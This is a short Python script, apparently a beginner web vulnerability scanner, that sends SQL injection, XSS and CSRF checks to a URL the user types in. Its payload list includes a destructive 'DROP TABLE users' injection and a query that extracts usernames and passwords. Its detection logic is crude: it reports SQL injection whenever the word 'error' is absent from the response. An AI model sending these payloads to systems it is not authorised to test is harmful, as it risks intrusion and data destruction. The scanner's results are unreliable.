import requests
from bs4 import BeautifulSoup

# Function to check for SQL Injection vulnerability
def test_sql_injection(url):
    print("[*] Testing for SQL Injection vulnerability...")
    payloads = ["' OR 1=1--", "' UNION SELECT NULL, username, password FROM users--", "'; DROP TABLE users;--"]
    for payload in payloads:
        response = requests.get(url + payload)
        if "error" not in response.text.lower():
            print(f"[+] Potential SQL Injection found with payload: {payload}")
            return True
    print("[-] No SQL Injection found.")
    return False

# Function to check for XSS (Cross-Site Scripting) vulnerability
def test_xss(url):
    print("[*] Testing for XSS vulnerability...")
    payload = "<script>alert('XSS')</script>"
    response = requests.get(url, params={"q": payload})  
    if payload in response.text:
        print(f"[+] Potential XSS found with payload: {payload}")
        return True
    print("[-] No XSS found.")
    return False

# Function to check for CSRF vulnerability
def test_csrf(url):
    print("[*] Testing for CSRF vulnerability...")
    response = requests.get(url)
    if 'csrf_token' not in response.text:  
        print("[+] CSRF token not found. Application may be vulnerable to CSRF attacks.")
        return True
    print("[-] CSRF token is present. No CSRF vulnerability detected.")
    return False

# Main function to run all tests
def run_security_tests(url):
    print(f"\n[+] Running security tests on {url}\n")
    if test_sql_injection(url):
        print("[!] SQL Injection vulnerability detected!")
    if test_xss(url):
        print("[!] XSS vulnerability detected!")
    if test_csrf(url):
        print("[!] CSRF vulnerability detected!")
    else:
        print("[*] No vulnerabilities detected!")

# User Input for URL
if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com): ")
    run_security_tests(target_url)
